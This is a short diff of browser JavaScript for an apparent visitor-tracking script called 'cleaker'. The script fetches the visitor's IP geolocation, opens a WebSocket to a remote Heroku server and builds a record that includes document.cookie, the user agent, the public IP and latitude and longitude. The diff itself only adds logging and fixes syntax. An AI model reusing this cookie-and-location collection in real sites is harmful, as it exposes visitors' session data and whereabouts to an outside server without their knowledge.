@@ -6,8 +6,6 @@ $.getJSON('https://json.geoiplookup.io/?callback=?', function(data) {
 //$('document').ready(function(){
 $.getJSON('https://json.geoiplookup.io/?callback=?', function(data) {
 		//SET DATA READY	
-
-	
 		//USE URL WS:// OR WSS:// (IF USING TLS)
 		var ws = new WebSocket("wss://monadlisa.herokuapp.com");
 		//var ws = new WebSocket("ws://localhost:5000"); //RUNNING LOCAL
@@ -30,7 +28,7 @@ $.getJSON('https://json.geoiplookup.io/?callback=?', function(data) {
 		 	 //RECEVING JSON.TYPE FROM INDEX
 			 if (ws_msg.type === 'cleaking'){ //first handshake with cleaker index
 				 var myUUID = ws_msg.uuid; //ID' the connection record
-				 
+				 console.log(data.ip);
 				 var cleaker ={   
 					 /*
   				   "ip": "190.123.41.176",
@@ -68,8 +66,7 @@ $.getJSON('https://json.geoiplookup.io/?callback=?', function(data) {
 					 platform: navigator.platform,
 					 cookies: document.cookie,
 					 userAgent: navigator.userAgent,
-					 webDriver: navigator.webdriver //interface indicates whether the user agent is controlled by automation.
-					 
+					 webDriver: navigator.webdriver, //interface indicates whether the user agent is controlled by automation. 
 					 publicIp: data.ip,
 					 latitude: data.latitude,
 					 longitude: data.longitude,
